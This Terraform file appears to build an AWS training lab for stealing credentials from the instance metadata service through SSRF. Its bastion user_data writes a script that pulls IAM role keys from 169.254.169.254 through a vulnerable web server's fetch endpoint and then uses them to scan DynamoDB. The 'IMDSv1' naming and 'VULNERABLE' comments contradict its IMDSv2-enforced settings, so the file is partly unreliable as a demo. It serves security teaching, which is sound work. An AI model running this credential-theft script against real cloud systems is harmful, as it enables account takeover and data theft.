terraform {
  required_version = ">= 1.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.region
}

# Get current caller identity for VPC condition
data "aws_caller_identity" "current" {}

# VPC Configuration
resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name = "imdsv1-lab-vpc"
  }
}

resource "aws_subnet" "public" {
  vpc_id                  = aws_vpc.main.id
  cidr_block              = "10.0.1.0/24"
  availability_zone       = data.aws_availability_zones.available.names[0]
  map_public_ip_on_launch = true

  tags = {
    Name = "imdsv1-lab-public-subnet"
  }
}

resource "aws_subnet" "private" {
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.2.0/24"
  availability_zone = data.aws_availability_zones.available.names[0]

  tags = {
    Name = "imdsv1-lab-private-subnet"
  }
}

resource "aws_internet_gateway" "main" {
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "imdsv1-lab-igw"
  }
}

resource "aws_route_table" "public" {
  vpc_id = aws_vpc.main.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.main.id
  }

  tags = {
    Name = "imdsv1-lab-public-rt"
  }
}

resource "aws_route_table_association" "public" {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}

# VPC Endpoint for DynamoDB
resource "aws_vpc_endpoint" "dynamodb" {
  vpc_id            = aws_vpc.main.id
  service_name      = "com.amazonaws.${var.region}.dynamodb"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = [aws_route_table.public.id]

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowDynamoDBFromWebServer"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.web_server.arn
        }
        Action = [
          "dynamodb:GetItem",
          "dynamodb:PutItem",
          "dynamodb:Scan",
          "dynamodb:Query"
        ]
        Resource = aws_dynamodb_table.products.arn
      }
    ]
  })

  tags = {
    Name = "imdsv1-lab-dynamodb-endpoint"
  }
}

# Security Groups
resource "aws_security_group" "bastion" {
  name_prefix = "bastion-sg-"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.my_ip]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "imdsv1-lab-bastion-sg"
  }
}

resource "aws_security_group" "web_server" {
  name_prefix = "web-server-sg-"
  vpc_id      = aws_vpc.main.id

  ingress {
    from_port       = 22
    to_port         = 22
    protocol        = "tcp"
    security_groups = [aws_security_group.bastion.id]
  }

  ingress {
    from_port   = 8080
    to_port     = 8080
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port       = 443
    to_port         = 443
    protocol        = "tcp"
    prefix_list_ids = [aws_vpc_endpoint.dynamodb.prefix_list_id]
  }

  tags = {
    Name = "imdsv1-lab-web-server-sg"
  }
}

# CloudWatch Log Groups
resource "aws_cloudwatch_log_group" "bastion" {
  name              = "/aws/ec2/imdsv1-lab/bastion"
  retention_in_days = 7

  tags = {
    Name = "imdsv1-lab-bastion-logs"
  }
}

resource "aws_cloudwatch_log_group" "web_server" {
  name              = "/aws/ec2/imdsv1-lab/web-server"
  retention_in_days = 7

  tags = {
    Name = "imdsv1-lab-web-server-logs"
  }
}

# IAM Role for Bastion
resource "aws_iam_role" "bastion" {
  name = "imdsv1-lab-bastion-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })

  tags = {
    Name = "imdsv1-lab-bastion-role"
  }
}

# CloudWatch Logs policy for Bastion
resource "aws_iam_role_policy" "bastion_cloudwatch" {
  name = "bastion-cloudwatch-policy"
  role = aws_iam_role.bastion.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents",
          "logs:DescribeLogStreams"
        ]
        Resource = [
          aws_cloudwatch_log_group.bastion.arn,
          "${aws_cloudwatch_log_group.bastion.arn}:*"
        ]
      }
    ]
  })
}

resource "aws_iam_instance_profile" "bastion" {
  name = "imdsv1-lab-bastion-profile"
  role = aws_iam_role.bastion.name
}

# IAM Role for Web Server (VULNERABLE - Too Permissive)
resource "aws_iam_role" "web_server" {
  name = "imdsv1-lab-web-server-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })

  tags = {
    Name = "imdsv1-lab-web-server-role"
  }
}

# MOST SECURE: DynamoDB policy requires VPC Endpoint
resource "aws_iam_role_policy" "web_server_dynamodb" {
  name = "web-server-dynamodb-policy"
  role = aws_iam_role.web_server.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "DynamoDBViaVPCEndpointOnly"
        Effect = "Allow"
        Action = [
          "dynamodb:GetItem",
          "dynamodb:PutItem",
          "dynamodb:Scan",
          "dynamodb:Query",
          "dynamodb:DescribeTable"
        ]
        Resource = aws_dynamodb_table.products.arn
        Condition = {
          StringEquals = {
            "aws:SourceVpce" = aws_vpc_endpoint.dynamodb.id
          }
        }
      }
    ]
  })
}

# CloudWatch Logs policy for Web Server
resource "aws_iam_role_policy" "web_server_cloudwatch" {
  name = "web-server-cloudwatch-policy"
  role = aws_iam_role.web_server.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents",
          "logs:DescribeLogStreams"
        ]
        Resource = [
          aws_cloudwatch_log_group.web_server.arn,
          "${aws_cloudwatch_log_group.web_server.arn}:*"
        ]
      }
    ]
  })
}

resource "aws_iam_instance_profile" "web_server" {
  name = "imdsv1-lab-web-server-profile"
  role = aws_iam_role.web_server.name
}

# DynamoDB Table
resource "aws_dynamodb_table" "products" {
  name           = "Products"
  billing_mode   = "PAY_PER_REQUEST"
  hash_key       = "ID"

  server_side_encryption {
    enabled = true
  }

  attribute {
    name = "ID"
    type = "S"
  }

  tags = {
    Name = "imdsv1-lab-products-table"
  }
}

# Sample DynamoDB Items
resource "aws_dynamodb_table_item" "product1" {
  table_name = aws_dynamodb_table.products.name
  hash_key   = aws_dynamodb_table.products.hash_key

  item = jsonencode({
    "ID"          = { "S" = "1" }
    "Name"        = { "S" = "Secure Cloud Widget" }
    "Description" = { "S" = "A highly secure cloud widget" }
    "Price"       = { "S" = "99.99" }
  })
}

resource "aws_dynamodb_table_item" "product2" {
  table_name = aws_dynamodb_table.products.name
  hash_key   = aws_dynamodb_table.products.hash_key

  item = jsonencode({
    "ID"          = { "S" = "2" }
    "Name"        = { "S" = "IMDS Guardian" }
    "Description" = { "S" = "Protects against IMDS attacks" }
    "Price"       = { "S" = "149.99" }
  })
}

resource "aws_dynamodb_table_item" "product3" {
  table_name = aws_dynamodb_table.products.name
  hash_key   = aws_dynamodb_table.products.hash_key

  item = jsonencode({
    "ID"          = { "S" = "3" }
    "Name"        = { "S" = "Secret Manager Pro" }
    "Description" = { "S" = "Enterprise secret management solution" }
    "Price"       = { "S" = "299.99" }
  })
}

# EC2 Instances
resource "aws_instance" "bastion" {
  ami                    = data.aws_ami.amazon_linux_2.id
  instance_type          = "t3.micro"
  key_name              = var.key_name
  subnet_id             = aws_subnet.public.id
  vpc_security_group_ids = [aws_security_group.bastion.id]
  iam_instance_profile   = aws_iam_instance_profile.bastion.name

  # SECURE: IMDSv2 enforced
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # SECURE: IMDSv2 only
    http_put_response_hop_limit = 1
    instance_metadata_tags      = "disabled"
  }

  user_data = <<-EOF
    #!/bin/bash
    yum update -y
    yum install -y git curl wget amazon-cloudwatch-agent
    
    # Install AWS CLI v2
    curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
    unzip awscliv2.zip
    ./aws/install
    
    # Configure CloudWatch agent
    cat > /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.json <<'CWCONFIG'
    {
      "logs": {
        "logs_collected": {
          "files": {
            "collect_list": [
              {
                "file_path": "/var/log/messages",
                "log_group_name": "/aws/ec2/imdsv1-lab/bastion",
                "log_stream_name": "{instance_id}/system",
                "timezone": "UTC"
              },
              {
                "file_path": "/var/log/secure",
                "log_group_name": "/aws/ec2/imdsv1-lab/bastion",
                "log_stream_name": "{instance_id}/secure",
                "timezone": "UTC"
              },
              {
                "file_path": "/home/ec2-user/*.log",
                "log_group_name": "/aws/ec2/imdsv1-lab/bastion",
                "log_stream_name": "{instance_id}/attack-logs",
                "timezone": "UTC"
              }
            ]
          }
        }
      }
    }
    CWCONFIG
    
    # Start CloudWatch agent
    /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
      -a fetch-config \
      -m ec2 \
      -s -c file:/opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.json
    
    # Create attack script
    cat > /home/ec2-user/steal-creds.sh <<'SCRIPT'
    #!/bin/bash
    echo "=== IMDSv1 Credential Theft Demo ==="
    echo ""
    echo "Target Web Server: ${1:-http://10.0.1.100:8080}"
    echo ""
    echo "Step 1: Exploiting SSRF to access IMDS..."
    echo "----------------------------------------"
    
    TARGET="${1:-http://10.0.1.100:8080}"
    
    # Get IAM role name
    echo "Getting IAM role name..."
    ROLE=$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    echo "Found role: $ROLE"
    echo ""
    
    # Get credentials
    echo "Stealing credentials..."
    CREDS=$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
    echo "Raw credentials response:"
    echo "$CREDS" | jq '.'
    echo ""
    
    # Parse credentials
    ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId')
    SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
    SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
    
    echo "Step 2: Using stolen credentials"
    echo "--------------------------------"
    echo "Setting up AWS CLI with stolen credentials..."
    
    export AWS_ACCESS_KEY_ID=$ACCESS_KEY
    export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
    export AWS_SESSION_TOKEN=$SESSION_TOKEN
    export AWS_REGION=us-east-1
    
    echo ""
    echo "Testing access to DynamoDB..."
    aws dynamodb scan --table-name Products --query 'Items[*].[ID.S, Name.S, Price.S]' --output table
    
    echo ""
    echo "Success! We've stolen the credentials and accessed the database!"
    
    # Log the attack for CloudWatch
    echo "[$(date)] Attack completed - Credentials stolen and database accessed" >> /home/ec2-user/attack.log
    SCRIPT
    
    chmod +x /home/ec2-user/steal-creds.sh
    
    # Create wrapper script that logs attacks
    cat > /home/ec2-user/run-attack.sh <<'WRAPPER'
    #!/bin/bash
    echo "[$(date)] Starting credential theft attack from $(whoami)" >> /home/ec2-user/attack.log
    ./steal-creds.sh "$@" 2>&1 | tee -a /home/ec2-user/attack.log
    echo "[$(date)] Attack script completed" >> /home/ec2-user/attack.log
    WRAPPER
    
    chmod +x /home/ec2-user/run-attack.sh
    
    # Install jq for JSON parsing
    yum install -y jq
    
    # Create log rotation
    cat > /etc/logrotate.d/attack-logs <<'LOGROTATE'
    /home/ec2-user/*.log {
        daily
        rotate 7
        compress
        delaycompress
        missingok
        notifempty
        create 0644 ec2-user ec2-user
    }
    LOGROTATE
  EOF

  tags = {
    Name = "imdsv1-lab-bastion"
  }
}

resource "aws_instance" "web_server" {
  ami                    = data.aws_ami.amazon_linux_2.id
  instance_type          = "t3.micro"
  key_name              = var.key_name
  subnet_id             = aws_subnet.public.id
  vpc_security_group_ids = [aws_security_group.web_server.id]
  iam_instance_profile   = aws_iam_instance_profile.web_server.name

  # SECURE: IMDSv2 enforced
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # SECURE: IMDSv2 only
    http_put_response_hop_limit = 1
    instance_metadata_tags      = "disabled"
  }

  user_data = <<-EOF
    #!/bin/bash
    yum update -y
    yum install -y golang git amazon-cloudwatch-agent
    
    # Configure CloudWatch agent for web server
    cat > /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.json <<'CWCONFIG'
    {
      "logs": {
        "logs_collected": {
          "files": {
            "collect_list": [
              {
                "file_path": "/var/log/messages",
                "log_group_name": "/aws/ec2/imdsv1-lab/web-server",
                "log_stream_name": "{instance_id}/system",
                "timezone": "UTC"
              },
              {
                "file_path": "/var/log/web-server.log",
                "log_group_name": "/aws/ec2/imdsv1-lab/web-server",
                "log_stream_name": "{instance_id}/application",
                "timezone": "UTC"
              },
              {
                "file_path": "/var/log/web-server-access.log",
                "log_group_name": "/aws/ec2/imdsv1-lab/web-server",
                "log_stream_name": "{instance_id}/access",
                "timezone": "UTC"
              },
              {
                "file_path": "/var/log/web-server-ssrf.log",
                "log_group_name": "/aws/ec2/imdsv1-lab/web-server",
                "log_stream_name": "{instance_id}/ssrf-attempts",
                "timezone": "UTC"
              }
            ]
          }
        }
      }
    }
    CWCONFIG
    
    # Start CloudWatch agent
    /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
      -a fetch-config \
      -m ec2 \
      -s -c file:/opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.json
    
    # Set up Go environment
    export GOPATH=/home/ec2-user/go
    export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
    
    # Copy web server code
    mkdir -p /home/ec2-user/web-server
    cd /home/ec2-user/web-server
    
    # Create the web server
    cat > main.go <<'GOFILE'
${file("/home/jg/git/shart-cloud-gh/imdsv1-lab/web-server/main.go")}
GOFILE
    
    # Create go.mod
    cat > go.mod <<'GOMOD'
${file("/home/jg/git/shart-cloud-gh/imdsv1-lab/go.mod")}
GOMOD
    
    # Download dependencies
    go mod download
    
    # Create log files with proper permissions
    touch /var/log/web-server.log /var/log/web-server-access.log /var/log/web-server-ssrf.log
    chown ec2-user:ec2-user /var/log/web-server*.log
    
    # Create systemd service
    cat > /etc/systemd/system/web-server.service <<'SERVICE'
    [Unit]
    Description=Vulnerable Web Server
    After=network.target
    
    [Service]
    Type=simple
    User=ec2-user
    WorkingDirectory=/home/ec2-user/web-server
    ExecStart=/usr/bin/go run main.go
    Restart=always
    Environment="AWS_REGION=us-east-1"
    Environment="PORT=8080"
    StandardOutput=append:/var/log/web-server.log
    StandardError=append:/var/log/web-server.log
    
    [Install]
    WantedBy=multi-user.target
    SERVICE
    
    # Start the service
    systemctl daemon-reload
    systemctl enable web-server
    systemctl start web-server
    
    # Change ownership
    chown -R ec2-user:ec2-user /home/ec2-user/
  EOF

  tags = {
    Name = "imdsv1-lab-web-server"
  }
}

# Data sources
data "aws_availability_zones" "available" {
  state = "available"
}

data "aws_ami" "amazon_linux_2" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

# Outputs
output "bastion_public_ip" {
  value = aws_instance.bastion.public_ip
}

output "web_server_public_ip" {
  value = aws_instance.web_server.public_ip
}

output "web_server_private_ip" {
  value = aws_instance.web_server.private_ip
}

output "cloudwatch_logs" {
  value = {
    bastion_logs   = "https://console.aws.amazon.com/cloudwatch/home?region=${var.region}#logsV2:log-groups/log-group/${aws_cloudwatch_log_group.bastion.name}"
    web_server_logs = "https://console.aws.amazon.com/cloudwatch/home?region=${var.region}#logsV2:log-groups/log-group/${aws_cloudwatch_log_group.web_server.name}"
  }
}

output "attack_command" {
  value = "ssh -i ${var.key_name}.pem ec2-user@${aws_instance.bastion.public_ip} './run-attack.sh http://${aws_instance.web_server.private_ip}:8080'"
}

output "view_logs_command" {
  value = "aws logs tail /aws/ec2/imdsv1-lab/web-server --follow --filter-pattern CRITICAL"
}

output "vpc_id" {
  value = aws_vpc.main.id
}

output "vpc_endpoint_id" {
  value = aws_vpc_endpoint.dynamodb.id
}